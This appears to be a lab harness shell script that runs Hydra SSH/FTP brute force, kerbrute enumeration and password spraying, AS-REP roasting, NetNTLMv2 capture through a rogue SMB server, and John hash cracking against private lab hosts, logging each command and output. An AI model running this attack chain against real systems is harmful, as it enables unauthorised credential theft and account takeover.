#!/bin/sh
# Runs inside the creds container: Hydra, kerbrute, impacket and John against lab-web and lab-dc, into /out.
# capture.sh writes arbor.ntds from lab-dc first: secretsdump cannot replicate from Samba.
set -u
WEB=10.99.56.10
DC=10.99.56.13
DOMAIN=arbor.lab.test
cd /out
log() { echo "\$ $*" >> creds-commands.txt; }
run() { log "$@"; "$@" || echo "  exit $?" >> creds-commands.txt; }

tries=0
until smbclient -N -L //$DC > /dev/null 2>&1 || [ $tries -ge 60 ]; do tries=$((tries + 1)); sleep 3; done

: > creds-commands.txt
hydra -h 2>&1 | head -1 >> creds-commands.txt
kerbrute version 2>&1 | grep -E 'Version|Commit' >> creds-commands.txt
john 2>&1 | head -1 >> creds-commands.txt
secretsdump.py -h 2>&1 | head -1 >> creds-commands.txt

printf '%s\n' quill admin backup > web-users.txt
printf '%s\n' Winter-Lab-25 Ink-Well-4 password > web-passwords.txt
printf '%s\n' rowan.ash alder.fern hazel.birch willow.reed elm.stone oak.none > users.txt
printf '%s\n' Winter-Lab-25 Spring-Lab-26 Birch:Bark9 Arbor-Admin-26 > wordlist.txt
rm -f hydra-*.txt hydra-*.json john.pot

run hydra -L web-users.txt -P web-passwords.txt -t 4 -o hydra-ssh.txt ssh://$WEB
run hydra -L web-users.txt -P web-passwords.txt -b json -o hydra-ftp.json ftp://$WEB
log "hydra -L web-users.txt -P web-passwords.txt ftp://$WEB | tee hydra-ftp-console.txt"
hydra -L web-users.txt -P web-passwords.txt ftp://$WEB | tee hydra-ftp-console.txt > /dev/null

log "kerbrute userenum -d $DOMAIN --dc $DC users.txt | tee kerbrute-userenum.txt"
kerbrute userenum -d $DOMAIN --dc $DC users.txt | tee kerbrute-userenum.txt > /dev/null
log "kerbrute passwordspray -d $DOMAIN --dc $DC users.txt Spring-Lab-26 | tee kerbrute-spray.txt"
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt Spring-Lab-26 | tee kerbrute-spray.txt > /dev/null
run kerbrute-1.0.3 passwordspray -d $DOMAIN --dc $DC -o kerbrute-o.txt users.txt Spring-Lab-26
run kerbrute passwordspray -d $DOMAIN --dc $DC -o kerbrute-master-o.txt users.txt Spring-Lab-26 > /dev/null

log "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC | tee getnpusers.txt"
GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC | tee getnpusers.txt > /dev/null

log "smbserver.py -debug -smb2support share /tmp | tee smbserver.txt, while smbclient //10.99.56.6/share -W ARBOR -U rowan.ash%Spring-Lab-26 -c ls"
PYTHONUNBUFFERED=1 smbserver.py -debug -smb2support share /tmp > smbserver.txt 2>&1 &
sleep 3
smbclient //10.99.56.6/share -W ARBOR -U 'rowan.ash%Spring-Lab-26' -c ls > /dev/null 2>&1
sleep 2
kill $!
log "sed -n 's/^\[\*\] \(.*::.*\)/\1/p' smbserver.txt > netntlmv2.txt"
sed -n 's/^\[\*\] \(.*::.*\)/\1/p' smbserver.txt > netntlmv2.txt

for pair in NT:arbor.ntds krb5asrep:getnpusers.txt netntlmv2:netntlmv2.txt; do
    format=${pair%%:*} file=${pair#*:} name=$(echo "$format" | tr 'A-Z' 'a-z')
    run john --pot=john.pot --format=$format --wordlist=wordlist.txt $file
    log "john --pot=john.pot --show --format=$format $file > john-show-$name.txt"
    john --pot=john.pot --show --format=$format $file > john-show-$name.txt
done
log "john --pot=john.pot --show=left --format=NT arbor.ntds > john-show-left.txt"
john --pot=john.pot --show=left --format=NT arbor.ntds > john-show-left.txt
